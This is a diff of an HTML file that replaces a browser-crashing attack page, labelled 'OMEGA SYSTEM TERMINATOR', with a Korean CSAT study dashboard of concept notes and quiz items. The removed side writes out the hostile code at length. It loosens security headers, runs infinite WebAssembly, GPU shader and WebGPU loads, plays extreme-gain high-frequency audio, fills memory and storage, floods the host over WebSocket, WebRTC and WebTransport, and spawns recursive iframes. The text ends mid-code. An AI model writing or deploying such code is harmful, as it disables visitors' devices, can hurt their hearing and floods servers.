@@ -1,456 +1,1690 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-    <!-- ====== 메타 태그를 통한 보안 무력화 (업그레이드: 모든 가능한 정책 무시 및 추가 취약점 유도) ====== -->
-    <meta charset="UTF-8">
-    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-eval' 'unsafe-inline' 'unsafe-dynamic' 'self' blob: data: mediastream: filesystem: about: ws: wss: chrome-extension: moz-extension: safari-extension:;">
-    <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
-    <meta http-equiv="Cross-Origin-Embedder-Policy" content="unsafe-none">
-    <meta http-equiv="Cross-Origin-Resource-Policy" content="cross-origin">
-    <meta http-equiv="Origin-Agent-Cluster" content="false">
-    <meta http-equiv="Strict-Transport-Security" content="max-age=0">
-    <meta http-equiv="X-Frame-Options" content="ALLOWALL">
-    <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-    <meta name="referrer" content="no-referrer">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="mobile-web-app-capable" content="yes">
-    <title>⚠️ OMEGA SYSTEM TERMINATOR v15.0.0 ⚠️</title>
-
-    <!-- ====== CSS 렌더링 엔진 공격 (업그레이드: 극한 다중 애니메이션, 필터 체인, 무한 레이어) ====== -->
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-shadow: 0 0 0 100vmax rgba(0,0,0,0.5), inset 0 0 0 100vmax rgba(255,0,0,0.5), 0 0 0 100vmax rgba(0,255,0,0.5); /* 트리플 그림자 GPU 핵과부하 */
-            backdrop-filter: blur(200px) saturate(1000%) brightness(500%) contrast(1000%); /* 극한 필터 체인 */
-            animation: doom 0.01s infinite alternate, chaos 0.02s infinite, apocalypse 0.03s infinite; /* 트리플 애니메이션 */
-            will-change: transform, opacity, filter, box-shadow, background, color; /* 모든 속성 강제 변경 */
-            pointer-events: none; /* 사용자 입력 방지 */
-        }
-
-        @keyframes doom {
-            0% { transform: translate(0,0) scale(1) rotate(0deg) skew(0deg); }
-            33% { transform: translate(300px,300px) scale(5) rotate(120deg) skew(30deg); }
-            66% { transform: translate(-300px,-300px) scale(0.05) rotate(240deg) skew(-30deg); }
-            100% { transform: translate(0,0) scale(10) rotate(360deg) skew(0deg); }
-        }
-
-        @keyframes chaos {
-            0% { opacity: 1; filter: blur(0) invert(0); }
-            50% { opacity: 0; filter: blur(100px) invert(1); }
-            100% { opacity: 1; filter: blur(0) invert(0); }
-        }
-
-        @keyframes apocalypse {
-            0% { background: red; color: black; }
-            50% { background: black; color: red; }
-            100% { background: red; color: black; }
-        }
-
-        body {
-            overflow: hidden;
-            position: fixed;
-            width: 100vw;
-            height: 100vh;
-            user-select: none;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>2027 수능 통합 학습 대시보드</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    :root {
+      color-scheme: dark;
+    }
+    body {
+      background: radial-gradient(circle at top, #1f2937, #0f172a 60%, #020617 100%);
+      color: #e2e8f0;
+      min-height: 100vh;
+    }
+    .glass {
+      background: rgba(15, 23, 42, 0.72);
+      border: 1px solid rgba(148, 163, 184, 0.2);
+      box-shadow: 0 20px 40px rgba(2, 6, 23, 0.45);
+      backdrop-filter: blur(12px);
+    }
+    .scrollbar::-webkit-scrollbar {
+      width: 8px;
+    }
+    .scrollbar::-webkit-scrollbar-thumb {
+      background: #334155;
+      border-radius: 999px;
+    }
+    .scrollbar::-webkit-scrollbar-track {
+      background: #0f172a;
+    }
+  </style>
 </head>
-<body onload="document.documentElement.requestFullscreen(); document.documentElement.requestPointerLock();">
-    <!-- ====== 1. CPU 핵융합 공격 시스템 (업그레이드: 공유 메모리 원자 연산 + 무한 워커 스폰) ====== -->
-    <script>
-        // (1-A) WebAssembly CPU 초고속 소멸 (업그레이드: 공유 배열 버퍼 + 원자 무한 루프)
-        (function() {
-            const sharedBuffer = new SharedArrayBuffer(1024 * 1024);
-            const sharedArray = new Int32Array(sharedBuffer);
-            const wasmCode = new Uint8Array([
-                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x01, 
-                0x60, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 
-                0x00, 0x07, 0x08, 0x01, 0x04, 0x6B, 0x69, 0x6C, 0x6C, 0x00, 0x00, 
-                0x0A, 0x11, 0x01, 0x0F, 0x00, 0x03, 0x40, 0x03, 0x40, 0x03, 0x00, 0x03, 0x00, 0x0B, 0x0B, 0x0B
-            ]);
+<body class="font-sans">
+  <main class="max-w-7xl mx-auto px-6 py-10">
+    <header class="mb-10 text-center">
+      <p class="text-indigo-300 tracking-[0.3em] text-sm uppercase">2027 Korean CSAT Master Lab</p>
+      <h1 class="text-4xl md:text-5xl font-bold mt-4">2027 수능 통합 학습 대시보드</h1>
+      <p class="text-slate-300 mt-3">국어, 수학, 영어, 한국사, 사회탐구, 과학탐구 전 영역의 핵심 개념과 문제풀이를 한 곳에서 학습합니다.</p>
+    </header>
 
-            const createWasmHell = () => {
-                Array.from({length: navigator.hardwareConcurrency * 5000}, () => {
-                    const mod = new WebAssembly.Module(wasmCode);
-                    const inst = new WebAssembly.Instance(mod, { shared: { mem: sharedBuffer } });
-                    while(true) { 
-                        inst.exports.kill(); 
-                        Atomics.add(sharedArray, 0, 1); // 원자 연산 과부하
-                    }
-                });
-            };
+    <section id="dashboard" class="grid md:grid-cols-2 xl:grid-cols-3 gap-6"></section>
 
-            // 0.01초마다 공격 초강화
-            let attackLevel = 1;
-            setInterval(() => {
-                attackLevel *= 5;
-                for(let i=0; i<attackLevel; i++) createWasmHell();
-            }, 10);
-        })();
+    <section id="studyView" class="hidden mt-10">
+      <div class="flex flex-wrap items-center justify-between gap-4 mb-6">
+        <div>
+          <p class="text-indigo-300 text-sm" id="subjectBadge">과목</p>
+          <h2 class="text-3xl font-semibold" id="studyTitle">학습 모드</h2>
+          <p class="text-slate-400" id="studySubtitle">하위 과목을 선택해 학습을 시작하세요.</p>
+        </div>
+        <div class="flex items-center gap-3">
+          <button id="backButton" class="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 transition">대시보드로</button>
+        </div>
+      </div>
 
-        // (1-B) 오디오 컨텍스트 고주파 공격 (업그레이드: 다중 게인 노드 + 디스토션 커브)
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const gainNode = audioContext.createGain();
-        gainNode.gain.value = 1000; // 극한 볼륨
-        const distortion = audioContext.createWaveShaper();
-        distortion.curve = new Float32Array(10000).fill(1); // 디스토션 과부하
-        distortion.connect(gainNode);
-        gainNode.connect(audioContext.destination);
-        setInterval(() => {
-            for(let i=0; i<50; i++) {
-                const oscillator = audioContext.createOscillator();
-                oscillator.type = ['square', 'sawtooth', 'triangle', 'sine'][Math.floor(Math.random()*4)];
-                oscillator.frequency.setValueAtTime(10000 + Math.random()*20000, audioContext.currentTime);
-                oscillator.connect(distortion);
-                oscillator.start();
-                setTimeout(() => oscillator.stop(), 20);
+      <div class="grid lg:grid-cols-[1.1fr_1.2fr] gap-6">
+        <div class="glass rounded-2xl p-6 flex flex-col min-h-[520px]">
+          <div class="flex items-center justify-between mb-4">
+            <h3 class="text-xl font-semibold">개념 노트</h3>
+            <span class="text-xs text-indigo-300" id="conceptCount">0개</span>
+          </div>
+          <div id="conceptList" class="space-y-4 overflow-y-auto pr-2 scrollbar"></div>
+        </div>
+
+        <div class="glass rounded-2xl p-6 flex flex-col min-h-[520px]">
+          <div class="flex items-center justify-between mb-4">
+            <h3 class="text-xl font-semibold">퀴즈 스테이션</h3>
+            <div class="text-sm text-slate-300">점수: <span id="scoreDisplay">0/0</span></div>
+          </div>
+          <div id="quizArea" class="flex-1">
+            <p class="text-slate-400">왼쪽에서 단원을 선택하면 퀴즈가 나타납니다.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    const CSAT_FULL_DB = {
+      "국어": {
+        "화법과작문": {
+          concepts: [
+            {
+              title: "토론의 필수 요소",
+              content: `토론은 주장, 근거, 반론이 유기적으로 맞물리는 의사소통 행위다. 사회적 쟁점을 다룰 때 토론자는 주장의 명확성, 근거의 신뢰성, 발화의 적절성을 동시에 갖추어야 하며, 상대의 주장에 대한 경청과 검증이 필수적이다. 특히 근거는 통계, 사례, 원리 등 객관적 자료를 활용해 설득력을 높여야 하며, 반론 제기 시에는 논점 일탈을 피하고 쟁점별로 정교하게 대응하는 태도가 중요하다.`
+            },
+            {
+              title: "협상의 절차",
+              content: `협상은 갈등 상황에서 상호 이익을 도출하기 위한 체계적 절차다. 준비 단계에서는 이해관계자 분석과 BATNA(협상 결렬 시 대안)를 설정하고, 개시 단계에서는 공감 형성을 통해 신뢰를 확보한다. 제안 단계에서는 서로의 요구를 명료하게 제시하며, 조정 단계에서는 양보와 교환 전략을 통해 합의 범위를 좁힌다. 마지막으로 합의 단계에서는 문서화와 이행 계획을 명확히 하여 후속 갈등을 예방한다.`
+            },
+            {
+              title: "발표 구성 전략",
+              content: `효과적인 발표는 청중 분석, 구조 설계, 전달 기술의 삼박자를 요구한다. 서론에서는 청중의 관심을 끌 수 있는 문제 제기나 사례를 활용하고, 본론에서는 핵심 논지를 2~3개의 소주제로 구분하여 논리적 흐름을 유지한다. 결론에서는 핵심 메시지를 재강조하며 실행 요청이나 요약을 제공해야 한다. 발표자는 비언어적 표현(시선, 제스처, 속도)을 통해 의미를 강화하고 청중의 이해를 점검한다.`
+            },
+            {
+              title: "청중 분석과 의사소통",
+              content: `청중 분석은 화자와 청자의 인식 차이를 줄이기 위한 핵심 과정이다. 연령, 배경지식, 가치관, 관심사에 따라 메시지의 표현 방식이 달라져야 하며, 용어 선택과 사례 제시도 청중 수준에 맞춰야 한다. 이를 통해 정보 전달의 효율을 높이고 오해를 예방할 수 있다. 특히 설득적 담화에서는 청중의 정서적 반응을 고려해 공감과 신뢰를 형성하는 전략이 중요하다.`
+            },
+            {
+              title: "담화의 목적별 전략",
+              content: `담화는 정보 전달, 설득, 친교 등 목적에 따라 구조와 표현이 달라진다. 정보 전달 담화는 사실 중심으로 간결하게 구성하며, 설득 담화는 근거의 타당성과 가치 호소를 병행한다. 친교 담화는 공감과 배려를 중심으로 맥락적 표현을 사용한다. 수능에서는 이러한 목적별 특성을 분석하여 글의 의도와 표현 방식을 파악하는 능력이 요구된다.`
+            },
+            {
+              title: "논증 유형의 이해",
+              content: `논증은 연역, 귀납, 유추의 방식으로 전개된다. 연역은 일반적 원리에서 구체적 결론을 도출하며 타당성이 강조된다. 귀납은 개별 사례를 통해 일반적 결론을 도출하므로 표본의 적절성이 중요하다. 유추는 두 대상의 유사성을 바탕으로 결론을 이끌지만, 비유의 한계가 존재한다. 논증 유형을 구분하면 글의 설득 구조와 오류 가능성을 평가할 수 있다.`
+            },
+            {
+              title: "대화의 협력 원리",
+              content: `그라이스의 협력 원리는 대화가 원활히 진행되도록 하는 규칙이다. 양의 격률은 적절한 정보량 제공, 질의 격률은 진실성 유지, 관계의 격률은 화제와 관련성 유지, 태도의 격률은 명료성 확보를 요구한다. 수능에서는 발화가 협력 원리를 어겼을 때 발생하는 함축 의미를 파악해야 하며, 대화 맥락에서 숨은 의도를 추론하는 능력이 필요하다.`
+            },
+            {
+              title: "설득 전략과 반박",
+              content: `설득은 논리적 근거, 정서적 호소, 화자의 신뢰성을 결합한 전략으로 이루어진다. 논리적 근거는 통계나 사실을 통해 논증을 강화하고, 정서적 호소는 가치와 감정을 자극해 동의를 이끌어낸다. 반박은 상대의 논증 전제를 검토해 오류를 지적하는 방식으로 이루어지며, 반박의 목적은 상대를 무너뜨리는 것이 아니라 논점의 타당성을 검증하는 데 있다.`
+            },
+            {
+              title: "매체 활용 발표",
+              content: `매체 활용 발표는 시각 자료와 언어적 설명의 조화를 요구한다. 표, 그래프, 영상은 정보를 압축해 전달하지만, 설명 없이 사용하면 오해를 유발할 수 있다. 발표자는 자료의 핵심 의미를 해석해 청중의 이해를 돕고, 매체가 전달하려는 메시지를 언어로 명확히 보완해야 한다. 또한 저작권을 고려한 자료 사용과 출처 표시는 신뢰성을 높이는 요소다.`
+            },
+            {
+              title: "글쓰기 과정",
+              content: `글쓰기 과정은 계획, 생성, 조직, 초고 작성, 수정 및 편집의 단계로 구성된다. 계획 단계에서 주제와 목적, 독자를 설정하고 자료를 수집한다. 생성 단계에서는 아이디어를 자유롭게 확장하며, 조직 단계에서 논리적 구조를 설계한다. 초고 작성 후에는 문장의 명료성, 논리적 연결성, 어휘의 적절성을 점검하고 수정하여 완성도를 높인다.`
             }
-        }, 1);
-    </script>
-
-    <!-- ====== 2. GPU 초절멸 시스템 (업그레이드: 다중 캔버스 + WebGL 확장 + 컴퓨트 셰이더) ====== -->
-    <script type="module">
-        // (2-A) WebGL 3.0 프래그먼트 셰이더 지옥 (업그레이드: 다중 셰이더 + 텍스처 오버로드)
-        (function() {
-            for(let c=0; c<10; c++) { // 다중 캔버스 생성
-                const canvas = document.createElement('canvas');
-                canvas.id = 'gpu_doom_' + c;
-                canvas.width = window.innerWidth * 50;
-                canvas.height = window.innerHeight * 50;
-                document.body.appendChild(canvas);
-
-                const gl = canvas.getContext('webgl2', { antialias: false, powerPreference: 'high-performance' });
-                gl.getExtension('EXT_color_buffer_float');
-                gl.getExtension('OES_texture_float_linear');
-
-                const shaderCode = `#version 300 es
-                    precision highp float;
-                    out vec4 fragColor;
-                    uniform sampler2D tex;
-                    void main() {
-                        for(int i=0; i<10000000; i++) { // 루프 100배 증가
-                            vec4 color = texture(tex, gl_FragCoord.xy / vec2(10000.0));
-                            fragColor = vec4(
-                                sin(float(gl_FragCoord.x * i) * color.r * tan(float(i))), 
-                                cos(float(gl_FragCoord.y * i) * color.g * sin(float(i))), 
-                                tan(float(i) * color.b * cos(float(i))), 
-                                1.0
-                            );
-                        }
-                    }`;
-                
-                const shader = gl.createShader(gl.FRAGMENT_SHADER);
-                gl.shaderSource(shader, shaderCode);
-                gl.compileShader(shader);
-                // 무한 렌더링 루프 with compute
-                function render() {
-                    gl.drawArrays(gl.TRIANGLES, 0, 100000); // 대규모 드로우
-                    requestAnimationFrame(render);
-                }
-                render();
+          ],
+          quizzes: [
+            {
+              q: "토론에서 근거의 신뢰성을 높이기 위한 전략으로 가장 적절한 것은?",
+              options: ["개인 경험만 반복한다.", "상대의 발언을 감정적으로 비난한다.", "객관적 통계나 사례를 제시한다.", "논점을 이탈해 다른 주제를 말한다.", "청중과 관련 없는 일화를 제시한다."],
+              answer: 2,
+              explanation: "근거의 신뢰성은 객관적 자료에 의해 강화된다. 통계나 사례를 제시해야 설득력이 높아진다."
+            },
+            {
+              q: "협상의 조정 단계에서 주로 이루어지는 활동은 무엇인가?",
+              options: ["BATNA 설정", "상호 이익을 위한 양보 조정", "청중 분석", "결렬 선언", "합의 문서 작성"],
+              answer: 1,
+              explanation: "조정 단계는 서로의 요구를 조율하고 양보를 교환하는 단계다."
+            },
+            {
+              q: "발표 서론의 기능으로 가장 적절한 것은?",
+              options: ["핵심 결론만 제시", "청중 흥미 유발 및 문제 제기", "세부 자료 분석", "반론 제기", "질문지 배포"],
+              answer: 1,
+              explanation: "서론은 청중의 관심을 끌고 발표 주제를 소개하는 역할을 한다."
+            },
+            {
+              q: "연역 논증의 특징으로 옳은 것은?",
+              options: ["사례를 모아 일반화한다.", "유사성을 통해 결론을 도출한다.", "일반 원리에서 구체 결론을 도출한다.", "감정적 호소가 중심이다.", "표본의 대표성이 핵심이다."],
+              answer: 2,
+              explanation: "연역은 일반 원리에서 구체적 결론을 이끌어 타당성을 강조한다."
+            },
+            {
+              q: "그라이스 협력 원리 중 '질의 격률'은 무엇을 요구하는가?",
+              options: ["관련성 유지", "명료한 표현", "진실성 유지", "정보량 최소화", "정서적 공감"],
+              answer: 2,
+              explanation: "질의 격률은 거짓을 말하지 말고 증거 있는 발화를 하라는 원리다."
+            },
+            {
+              q: "설득 전략 중 화자의 신뢰성을 높이는 요소는?",
+              options: ["허위 통계 제시", "전문성·도덕성 강조", "공격적 비난", "논점 회피", "사실 왜곡"],
+              answer: 1,
+              explanation: "화자의 신뢰성은 전문성과 도덕성을 통해 확보된다."
+            },
+            {
+              q: "매체 활용 발표에서 주의할 점으로 적절한 것은?",
+              options: ["자료 출처를 숨긴다.", "시각 자료만 제시하고 설명은 생략한다.", "자료의 의미를 언어로 보완한다.", "청중 수준과 무관하게 전문 용어를 나열한다.", "모든 자료를 과도하게 반복한다."],
+              answer: 2,
+              explanation: "시각 자료는 설명과 함께 제시해야 정확한 이해를 돕는다."
+            },
+            {
+              q: "글쓰기 과정 중 '조직' 단계의 핵심 활동은?",
+              options: ["주제 선정", "아이디어 논리적 배열", "맞춤법 검사", "자료 수집", "최종 배포"],
+              answer: 1,
+              explanation: "조직 단계는 아이디어를 논리적으로 배열해 구조를 설계한다."
+            },
+            {
+              q: "청중 분석의 효과로 볼 수 없는 것은?",
+              options: ["전달 효율 증가", "오해 예방", "공감 형성", "논점 이탈", "표현 방식 조정"],
+              answer: 3,
+              explanation: "청중 분석은 논점 이탈을 유발하지 않고 오히려 메시지 최적화를 돕는다."
+            },
+            {
+              q: "담화 목적이 친교일 때 적절한 표현 전략은?",
+              options: ["정확한 통계만 제시", "공감과 배려 중심의 표현", "논리적 증명 강조", "반론 중심 전개", "전문 용어로만 구성"],
+              answer: 1,
+              explanation: "친교 담화는 공감과 배려를 중심으로 관계 형성을 목표로 한다."
             }
-        })();
-
-        // (2-B) WebGPU VRAM 초고속 포화 (업그레이드: 다중 디바이스 + 컴퓨트 파이프라인)
-        (async () => {
-            try {
-                const adapter = await navigator.gpu.requestAdapter({ powerPreference: 'high-performance' });
-                const device = await adapter.requestDevice({ label: 'doom' });
-                const bufferSize = 10 ** 12 * 5; // 5TB 시도
-                const buffer = device.createBuffer({
-                    size: bufferSize,
-                    usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC | GPUBufferUsage.COPY_DST | GPUBufferUsage.INDIRECT
-                });
-                const computeShader = device.createComputePipeline({
-                    layout: 'auto',
-                    compute: {
-                        module: device.createShaderModule({
-                            code: ` @compute @workgroup_size(64) fn main() { while(true) {} } `
-                        }),
-                        entryPoint: 'main'
-                    }
-                });
-                setInterval(() => {
-                    device.queue.writeBuffer(buffer, 0, new Uint8Array(bufferSize).fill(Math.random()*255));
-                    const commandEncoder = device.createCommandEncoder();
-                    const passEncoder = commandEncoder.beginComputePass();
-                    passEncoder.setPipeline(computeShader);
-                    passEncoder.dispatchWorkgroups(1000000); // 극한 컴퓨트 디스패치
-                    passEncoder.end();
-                    device.queue.submit([commandEncoder.finish()]);
-                }, 0.1);
-            } catch(e) {
-                console.error("GPU 파괴 실패:", e);
+          ]
+        },
+        "언어와매체": {
+          concepts: [
+            {
+              title: "언어의 본질",
+              content: `언어는 사회적 약속에 의해 성립하는 기호 체계이며, 음성 중심성과 자의성, 사회성, 변화성 등의 특성을 지닌다. 자의성은 의미와 형태가 필연적 관계가 아니라는 것을 뜻하고, 사회성은 공동체에서만 의미가 성립함을 보여준다. 변화성은 시대와 문화에 따라 어휘와 문법이 변한다는 점을 강조하며, 이러한 특성은 국어 생활의 실제와 언어 변화 이해에 활용된다.`
+            },
+            {
+              title: "언어의 기능",
+              content: `언어는 정보 전달, 정서 표현, 친교, 설득, 미적 기능 등 다양한 역할을 수행한다. 같은 문장이라도 상황과 목적에 따라 기능이 달라지므로 화용적 맥락을 파악해야 한다. 수능에서는 언어 기능을 분석하여 발화 목적을 추론하거나 문맥에 따른 의미 변화를 이해하는 능력이 요구된다. 예를 들어 명령문이지만 실은 부탁이나 제안을 의미할 수 있다.`
+            },
+            {
+              title: "음운 변동",
+              content: `음운 변동은 발음을 쉽게 하거나 의미를 구별하기 위해 나타나는 음성·음운 변화다. 교체, 탈락, 첨가, 축약의 유형으로 나뉘며, 대표적으로 된소리되기, 자음 동화, 구개음화 등이 있다. 음운 변동은 표기와 발음의 차이를 설명하는 핵심 개념이며, 표준 발음법의 원리를 이해하는 데 필수적이다.`
+            },
+            {
+              title: "형태소와 단어 형성",
+              content: `형태소는 의미를 가지는 최소 단위이며, 어근과 접사로 구분된다. 단어 형성 방식에는 파생, 합성, 축약, 전성 등이 있으며 각 방식의 의미 변화와 품사 변화가 수반된다. 예를 들어 '먹+이'는 사동 의미를 가진 파생어를 형성하고, '손목시계'는 합성어로 새로운 의미를 생성한다. 수능에서는 어휘 형성 과정과 의미 변화를 분석한다.`
+            },
+            {
+              title: "문장 성분과 호응",
+              content: `문장 성분은 주어, 서술어, 목적어, 보어, 관형어, 부사어, 독립어로 구성되며, 각 성분 간 호응이 문장 의미의 정확성을 좌우한다. 서술어에 따라 필수 성분이 달라지고, 조사 선택이 의미를 규정한다. 또한 시제, 높임, 부정 표현 등 다양한 문법 요소가 문장 의미를 조절하므로 문법적 오류를 판단하기 위해 성분 간 관계를 파악해야 한다.`
+            },
+            {
+              title: "어휘의 의미 관계",
+              content: `어휘 의미 관계에는 유의 관계, 반의 관계, 상하 관계, 동음이의 관계 등이 있다. 유의어는 의미가 유사하지만 뉘앙스가 다르고, 반의어는 의미가 대립한다. 상하 관계는 개념 범주의 포함 관계를 나타내며, 동음이의어는 형태는 같지만 의미가 다른 단어다. 이를 통해 문맥 속 어휘 선택의 의미 차이를 분석할 수 있다.`
+            },
+            {
+              title: "표준어와 방언",
+              content: `표준어는 국가적 공용어로 합의된 언어 규범이며, 방언은 지역적 특성을 가진 언어 형태다. 방언은 지역 문화의 다양성을 보여주는 중요한 언어 자산이지만, 표준어는 공적인 의사소통에서 통일성을 제공한다. 수능에서는 표준어 규정과 방언의 음운·어휘 차이를 이해하고, 상황에 맞는 언어 사용의 중요성을 판단해야 한다.`
+            },
+            {
+              title: "높임 표현 체계",
+              content: `높임 표현은 주체, 객체, 청자를 높이는 방식으로 구분된다. 주체 높임은 선어말 어미 '-시-'를 활용하고, 객체 높임은 특수 어휘(드리다, 모시다 등)를 사용한다. 청자 높임은 종결 어미의 선택을 통해 이루어진다. 높임 표현은 인간관계와 사회적 맥락을 반영하므로 상황에 맞는 적절한 높임 수준을 선택하는 능력이 중요하다.`
+            },
+            {
+              title: "문체와 담화 관습",
+              content: `문체는 문장의 길이, 어휘 선택, 표현 방식에 따라 형성되는 글의 분위기다. 공식적 문체는 객관적·논리적 표현을 사용하며, 비공식적 문체는 친근하고 구어체적 표현을 활용한다. 담화 관습은 사회적 상황에서 기대되는 언어 사용 방식이며, 이는 시대와 매체에 따라 변화한다. 수능에서는 문체와 담화 관습을 분석하여 글의 성격을 판단한다.`
+            },
+            {
+              title: "매체 언어의 특성",
+              content: `매체 언어는 디지털 환경에서 사용되는 언어로, 속도와 상호작용성이 높고 이미지·영상과 결합되는 특성을 가진다. 축약어, 이모티콘, 해시태그 등은 의미를 압축해 전달하며, 맥락에 따라 의미가 달라진다. 매체 언어의 긍정적 기능과 부정적 영향(오해, 혐오 표현)을 균형 있게 이해하는 태도가 필요하다.`
+            },
+            {
+              title: "국어 규범의 역할",
+              content: `국어 규범은 맞춤법, 표준 발음, 띄어쓰기, 외래어 표기 등으로 구성되며, 의사소통의 정확성과 통일성을 확보한다. 규범은 절대적 규칙이 아니라 사회적 합의이므로 시대 변화에 따라 개정될 수 있다. 수능에서는 규범 적용의 타당성을 평가하고, 실제 언어 사용에서 규범과 현실의 균형을 이해해야 한다.`
             }
-        })();
-    </script>
-
-    <!-- ====== 3. 메모리 대학살 시스템 (업그레이드: 무한 할당 루프 + WeakRef 방지) ====== -->
-    <script>
-        // (3-A) RAM 초고속 소모 (업그레이드: 글로벌 참조 + 크립토 체인)
-        const globalKillers = [];
-        setInterval(() => {
-            while(true) {
-                try {
-                    const buf = new ArrayBuffer(1024 * 1024 * 1000); // 1GB씩 무한
-                    globalKillers.push(buf);
-                    crypto.subtle.digest('SHA-512', buf)
-                        .then(hash => crypto.subtle.digest('SHA-256', hash))
-                        .then(() => {});
-                } catch(e) { break; }
+          ],
+          quizzes: [
+            {
+              q: "언어의 특성 중 '자의성'을 가장 잘 설명한 것은?",
+              options: ["언어는 변하지 않는다.", "형태와 의미가 필연적 관계가 아니다.", "언어는 개인만의 것이다.", "언어는 본능적이다.", "언어는 단일 기능만 가진다."],
+              answer: 1,
+              explanation: "자의성은 언어 형태와 의미 사이에 필연적 관계가 없다는 뜻이다."
+            },
+            {
+              q: "음운 변동의 유형으로 옳지 않은 것은?",
+              options: ["교체", "탈락", "첨가", "축약", "확대"],
+              answer: 4,
+              explanation: "음운 변동은 교체, 탈락, 첨가, 축약으로 분류되며 '확대'는 포함되지 않는다."
+            },
+            {
+              q: "'먹이'의 형성 방식으로 옳은 것은?",
+              options: ["합성", "파생", "전성", "축약", "중의"],
+              answer: 1,
+              explanation: "'먹+이'는 접사가 붙어 의미가 확장된 파생어이다."
+            },
+            {
+              q: "문장 성분 중 서술어에 따라 필수로 요구되는 성분은?",
+              options: ["독립어", "관형어", "부사어", "목적어", "부사어와 관형어"],
+              answer: 3,
+              explanation: "타동사 서술어는 목적어를 필수로 요구한다."
+            },
+            {
+              q: "동음이의어의 특징으로 옳은 것은?",
+              options: ["의미가 완전히 같음", "형태는 같지만 의미가 다름", "의미가 반대임", "의미가 상위 관계임", "형태가 다르고 의미가 같음"],
+              answer: 1,
+              explanation: "동음이의어는 발음이나 표기는 같으나 의미가 다른 단어이다."
+            },
+            {
+              q: "표준어의 기능으로 적절한 것은?",
+              options: ["지역어 다양성 억제", "국가적 통일성 확보", "모든 방언 제거", "언어 변화를 차단", "개인 표현 제한"],
+              answer: 1,
+              explanation: "표준어는 공적인 의사소통에서 통일성을 확보한다."
+            },
+            {
+              q: "주체 높임 표현을 나타내는 요소는?",
+              options: ["-겠다", "-시-", "-다", "-구나", "-께"],
+              answer: 1,
+              explanation: "'-시-'는 주체를 높이는 선어말 어미다."
+            },
+            {
+              q: "공식적 문체의 특징으로 알맞은 것은?",
+              options: ["구어체 표현 중심", "감탄사 남발", "객관적·논리적 표현", "축약어 사용", "이모티콘 활용"],
+              answer: 2,
+              explanation: "공식적 문체는 객관적이고 논리적인 표현을 사용한다."
+            },
+            {
+              q: "매체 언어의 긍정적 기능으로 볼 수 있는 것은?",
+              options: ["혐오 표현 확산", "의미 왜곡", "정보 전달 속도 향상", "오해 유발", "표현 다양성 감소"],
+              answer: 2,
+              explanation: "매체 언어는 정보 전달 속도를 높이고 상호작용성을 강화한다."
+            },
+            {
+              q: "국어 규범에 대한 설명으로 옳은 것은?",
+              options: ["절대 변하지 않는다.", "사회적 합의로 형성된다.", "개인 취향에 따라 달라진다.", "문법과 무관하다.", "발음만 포함한다."],
+              answer: 1,
+              explanation: "국어 규범은 사회적 합의를 통해 형성되며 시대에 따라 개정될 수 있다."
             }
-        }, 100);
-
-        // (3-B) Storage 동시 공격 (업그레이드: 퀴즈 스토리지 + 캐시 API)
-        navigator.storage.persist().then(() => {
-            caches.open('doom-cache').then(cache => {
-                setInterval(() => {
-                    cache.add(new Request(`data:application/octet-stream;base64,${btoa(new ArrayBuffer(10**9 * 5))}`));
-                }, 10);
-            });
-            setInterval(() => {
-                for(let i=0; i<50; i++) {
-                    localStorage.setItem(`kill_${Date.now()}_${i}`, new Blob([new ArrayBuffer(10 ** 9 * 5)])); // 5GB
-                    sessionStorage.setItem(`die_${Date.now()}_${i}`, new ArrayBuffer(10 ** 9 * 5));
-                }
-                indexedDB.open('armageddon', 1).onsuccess = e => {
-                    const db = e.target.result;
-                    const tx = db.transaction('doom', 'readwrite');
-                    const store = tx.objectStore('doom');
-                    for(let i=0; i<20; i++) {
-                        store.add(new Blob([new ArrayBuffer(10 ** 9 * 2)]), Date.now() + i);
-                    }
-                };
-            }, 10);
-        });
-    </script>
-
-    <!-- ====== 4. 네트워크 핵폭격 시스템 (업그레이드: 다중 프로토콜 + 데이터 플러드) ====== -->
-    <script type="module">
-        // (4-A) WebTransport 초초고속 UDP 폭격 (업그레이드: 1000개 트랜스포트 + QUIC 오버로드)
-        (async () => {
-            for(let i=0; i<1000; i++) {
-                try {
-                    const transport = new WebTransport(`quic-transport://${location.host}/doom${i}`);
-                    await transport.ready;
-                    const writer = transport.datagrams.writable.getWriter();
-                    setInterval(() => {
-                        writer.write(new Uint8Array(10 ** 9).fill(0xFF)); // 1GB UDP 플러드
-                    }, 0.01);
-                } catch(e) {}
-            }
-        })();
-
-        // (4-B) WebSocket/WebRTC 6666개 연결 (업그레이드: 6666개, 무한 바이너리 전송)
-        Array.from({length: 6666}, () => {
-            const ws = new WebSocket(`wss://${location.host}/ws`);
-            ws.onopen = () => setInterval(() => ws.send(new Uint8Array(10**8)), 0.1);
-            const pc = new RTCPeerConnection();
-            const channel = pc.createDataChannel('doom');
-            channel.onopen = () => setInterval(() => channel.send(new Uint8Array(10**8)), 0.1);
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            fetch(location.href, { method: 'POST', body: new Blob([new ArrayBuffer(10**8)]) }); // 추가 fetch 플러드
-        });
-    </script>
-
-    <!-- ====== 5. DOM 트리 붕괴 시스템 (업그레이드: 극한 재귀 + MutationObserver 오버로드) ====== -->
-    <script>
-        // (5-A) 자가복제 iframe 지옥 (업그레이드: 10레벨 재귀 + shadow DOM)
-        let iframeCount = 0;
-        function createHell() {
-            const div = document.createElement('div');
-            const shadow = div.attachShadow({mode: 'open'});
-            const iframe = document.createElement('iframe');
-            iframe.srcdoc = `
-                <script>
-                    function recurse(depth) {
